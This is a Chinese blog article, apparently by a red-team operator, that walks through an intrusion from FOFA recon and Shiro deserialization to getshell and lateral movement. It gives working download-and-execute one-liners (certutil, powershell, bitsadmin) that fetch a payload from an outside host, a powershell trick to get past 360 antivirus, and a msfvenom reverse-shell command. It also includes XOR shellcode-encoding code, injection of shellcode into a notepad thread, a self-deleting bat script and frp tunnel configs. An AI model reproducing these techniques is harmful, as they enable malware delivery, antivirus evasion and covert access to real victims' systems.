> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/ukcmK6nbIk2pXZrNLj-GRg)

> 现在我依稀记得大家在 9 月 25 日晚集体过年的场景，没想到的是：那 tm 只是开始
> 
> 这一段时间一直在打攻防，重复、单调、无长进，希望早日脱离苦海吧

下面以攻防过程中的一段经历来展现一些有意思的 tips

* * *

### 0x01 信息收集

关于信息收集，已经有方法论类的东西总结的很好了，我只说我喜欢的, 以百度代替真实站点

> fofa

*   domain="baidu.com"
    
*   host="baidu.com"
    
*   title="baidu"
    
*   title="百度"
    
*   title="百度一下，你就知道"
    
*   body="(京)- 经营性 - 2017-0020"
    
*   body="京公网安备 11000002000001 号"
    
*   body="京 ICP 证 030173 号"
    
*   icon_hash="-1507567067"
    
*   cert="baidu.com"
    

组合起来就是：

*   (host="baidu.com" || domain="baidu.com" || title="baidu" || title="百度" || title="百度一下，你就知道" || body="(京)- 经营性 - 2017-0020" || body="京公网安备 11000002000001 号" || body="京 ICP 证 030173 号" || icon_hash="-1507567067" || cert="baidu.com") && country="CN" && region!="HK" && region!="TW"
    

![](https://mmbiz.qpic.cn/mmbiz_png/fZT30hrVgRfu0caWH4oME8ZFJy9M3kbLNdT3dlAE9wSnTfDbcKmGSIiamic7Yw6R4hGibU9brfkbnHaQdESP6HPDg/640?wx_fmt=png)

导出结果可以使用 fofa 客户端

> 子域名挖掘

*   OneforAll
    
*   subDomainsBrute
    
*   theHarvester
    

> 邮箱

*   Google
    

*   site:github.com @baidu.com
    

*   theHarvester
    

*   挂代理
    

0x02 资产梳理
---------

> goby 内测版

*   安装好插件
    
*   勾选 upnp 等协议的发现
    
*   给定的全部端口
    

> Nmap 辅助

*   -sV
    
*   -O
    
*   --script=banner,vuln,exploit,brute
    

0x03 摸点
-------

*   网络设备、安全设备的默认口令
    
*   Weblogic、Struts2 远程代码执行
    
*   tomcat 默认口令
    
*   shiro 反序列化
    

这次的目标就是从 shiro 默认 key 反序列化开始的

![](https://mmbiz.qpic.cn/mmbiz_png/fZT30hrVgRfu0caWH4oME8ZFJy9M3kbLBJWMbCnzq2MEuckVaR69xw2GPCNI9iaQJkPMJmXXnC0Vuc6r1BCNYeA/640?wx_fmt=png)

默认 key，使用 CommonsCollections10 测试是否出网

![](https://mmbiz.qpic.cn/mmbiz_png/fZT30hrVgRfu0caWH4oME8ZFJy9M3kbLUHgolX9Yz0vVRIQM7LdSf1de5zmr3U3TkzPpy0icZ3MGxByZTjpjmdA/640?wx_fmt=png)

稳了呀！

0x04 getshell
-------------

下马，上线

```
certutil -urlcache -split -f http://xx.xx.xx.xx/robots.txt C:\Users\admin\a.exe && C:\Users\admin\a.exe
```

在 cs 上等了很久也没有等到上线，到 vps 上一看，发现目标并没有发起下载请求，心中暗叫一声不好，估计有 edr  

tasklist 看一下

![](https://mmbiz.qpic.cn/mmbiz_png/fZT30hrVgRfu0caWH4oME8ZFJy9M3kbLmnbcvsT9955jkgibMwiaEdj2GBY56FexRy3A8b9PialDtZrpibdVugS6mg/640?wx_fmt=png)

果然，有 360，这个时候就需要考虑两件事了

*   下载动作需要免杀
    
*   木马需要免杀
    

360 是出了名的疯， 起个 powershell，vbs 没干啥就会拦截

但是，作为一个怀旧（啥也不会）的人，我还是打算把之前的方法试一试

1.  powershell
    

```
powershell (new-object System.Net.WebClient).DownloadFile(' http://xx.xx.xx.xx/robots.txt','C:\Users\admin\a.exe');start-process 'C:\Users\admin\a.exe'
```

2.  bitsadmin
    

```
bitsadmin /transfer n http://xx.xx.xx.xx/robots.txt C:\Users\admin\a.exe && C:\Users\admin\a.exe
```

还有很多，具体参照下面这篇文章

https://xz.aliyun.com/t/1649#toc-5

但是无一意外的被 360 干掉，没招了，只能自力更生了

* * *

**接下来就是本文的重点了**

> powershell

正常的 powershell 下载文件确实会被干掉：

![](https://mmbiz.qpic.cn/mmbiz_png/fZT30hrVgRfu0caWH4oME8ZFJy9M3kbLZX0pNLgIqTetaoeJl9BqIwzRMWldL30u12qxufOy8Srzb7b1giatWsA/640?wx_fmt=png)

但是可以通过

```
echo (new-object System.Net.WebClient).DownloadFile('http://192.168.31.93:8000/tomcat.exe','C:/Users/test/cc.exe')| powershell -
```

来进行绕过：

![](https://mmbiz.qpic.cn/mmbiz_png/fZT30hrVgRfu0caWH4oME8ZFJy9M3kbLhMFX5yMfw7jUPqbKzQudSS12qMnax6G2nP0YN1XhceibH8U7P9hhBXw/640?wx_fmt=png)

但是要注意，如果目标目录为桌面或者 system32，360 仍然会产生提醒，但是文件仍然会下载下来，且可以正常执行：

![](https://mmbiz.qpic.cn/mmbiz_png/fZT30hrVgRfu0caWH4oME8ZFJy9M3kbLfesSZyyjxX3mCTAR1glBkx5f1AkMlsaOyAKxS2JjibK4nY1iaFUgOj2Q/640?wx_fmt=png)

> certutil

如果目标机器较老，很可能不存在 powershell，此时就需要使用一些老方法，即 certutil

certutil 绕过 360 的方式网上已经有了（[记一次渗透测试后引发的小扩展](http://mp.weixin.qq.com/s?__biz=MzAwMzYxNzc1OA==&mid=2247488584&idx=1&sn=c2aa80f6af4a018f89d872865ab86f38&chksm=9b3932f9ac4ebbefadeda1f7c374a2f3d24cf88ccb841643b27c37ed9dfe975db14dc1dc776e&scene=21#wechat_redirect)），

这里再提一个 certutil 编码解码。

windows 不像 linux，自带 base64 编码解码，但是 certutil 可以

```
certutil -encode x.exe x.txt

certutil -decode x.txt x.exe
```

通过编码指令将 exe 编码生成 txt 文件，然后通过 echo 写入，再调用 certutil 解码还原为 PE 文件

![](https://mmbiz.qpic.cn/mmbiz_png/fZT30hrVgRfu0caWH4oME8ZFJy9M3kbLv8htLMmLOYnhNyYtayvPeebztmNZ0F3pqzMyibzcWU4smXNDIrgicZeg/640?wx_fmt=png)

但是此时还有一个问题，就是 echo 无法一次性写入，需要换行，但是马编码后太长，所以不太方便。

暂时想到两个解决办法：

*   python 脚本边读本地 txt 边 echo 到对方服务器
    
*   写一个小程序，作用是在当前目录输出 txt，再通过压缩的方式压缩程序大小，再通过 certutil 编码写入解码执行
    

> 木马免杀

解决了下载问题，接下来就是木马免杀，这次我就不再怀旧了，毕竟也没啥用，直接上部分干货吧

用 c 写木马，一般绕不过两个问题：

*   shellcode 编码免杀
    
*   shellcode 加载方式免杀
    

单纯使用 metaslpoit 生成 shellcode：

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.31.93 LPORT=1234 -f c > ~/Desktop/text.c
```

不管使用什么加载方式，如果只是单纯的加载这种 shellcode，是一定会被杀毒软件查杀的，网上有人提出用 msfvenom 自带的编码器编码，我尝试了一下，仍然会被火绒 kill，所以这里可以自己去编码：

```
int key = 0x1a;
    unsigned char shellcode[sizeof(buf)] = "";
    for (int i = 0; i < sizeof(buf) - 1; i++)
    {
        shellcode[i] = (buf[i] ^ key) - 0x4;
    }
```

就这样一个很简单的异或 + 减去一个随机字符，就可以绕过杀软对 shellcode 的静态查杀，当然木马也需要进行相应的解码。

shellcode 加载方式现在也有很多，传统的方法是开辟一块地址空间存放 shellcode，并将 EIP/RIP 指向该地址。

我这里选择线程注入的方式来做到隐蔽和免杀。

使用

```
CreateProcessA(NULL, (LPSTR)"notepad", NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi);
```

创建 notepad 进程，然后开辟一块 Buffer，将 shellcode 写入 buffer，再使用

```
GetThreadContext(pi.hThread, &ctx);
ctx.Rip = (DWORD64)lpBuffer;
```

开辟一块线程并将 rip 指向 buffer，就可执行对应的 shellcode。通过此方法即可做到免杀，且进程为 notepad，隐蔽性极强：

![](https://mmbiz.qpic.cn/mmbiz_png/fZT30hrVgRfu0caWH4oME8ZFJy9M3kbLoVsN8Z4y8zAWjC7bwrmrCsmwrtmjPelKEEvz9cyo4xibrWYqIsZCG4g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/fZT30hrVgRfu0caWH4oME8ZFJy9M3kbLde9LmJhjHO83hibzmYJuWLBJnoiaZcHw97gDLkicP2VSKycpGvGFR0Bng/640?wx_fmt=png)

这里再提一个隐蔽的 tips，就是自删除，我采用的方式是 bat + 自解压（自解压的详细操作在 phishing 中），这里附上 bat 脚本：

```
@ECHO OFF
set a=y.exe                            rem 定义a为马的名称
set b="%cd%\%a%"                rem 定义b为马的路径    
del /f /a /q %sfxcmd%        rem 删除自解压程序
del /f /a /q %b%                rem 删除马
del /f /a /q %0%                rem 删除bat自身
```

0x05 内网渗透
---------

> 我对于攻防比赛中的内网渗透是及其反感的，迫于得分，所以不得不去做一些体力活，但是这种东西做的再多也没有意义

> frp 设置 socks5 代理并进行端口映射

公网 vps frps.ini

```
[common]
bind_addr =0.0.0.0
bind_port =7000
token = 9iathybNR7KL7EHd
```

目标主机 frpc.ini

```
[common]
server_addr =VPS_IP
server_port =7000
token = 9iathybNR7KL7EHd

[socks_proxy]
type = tcp
remote_port =8010
plugin = socks5
```

开启 socks 并映射端口

```
frpc.exe -c frpc.ini
```

> 永恒之蓝扫描

https://www.maritimecybersecurity.center/exploiting-windows-with-eternalblue-and-doublepulsar-with-metasploit/

> mimikatz 抓明文密码 & 用密码撞库

这里附上之前的文章

> 弱口令

> 域控

*   ms14-068
    
*   Netlogon 特权提升漏洞 (CVE-2020-1472)
    

就写到这吧，剩下的垃圾套路丢不起那人，大家把重点放在绕 360 下载和木马免杀就好

**关注公众号: HACK 之道**  

![](https://mmbiz.qpic.cn/mmbiz_jpg/GzdTGmQpRic3qL1R1NCVbY1ElanNngBlMTUKUibAUoQNQuufs7QibuMXoBHX5ibneNiasMzdthUAficktvRzexoRTXuw/640?wx_fmt=jpeg)

如文章对你有帮助，请支持点下 “赞”“在看”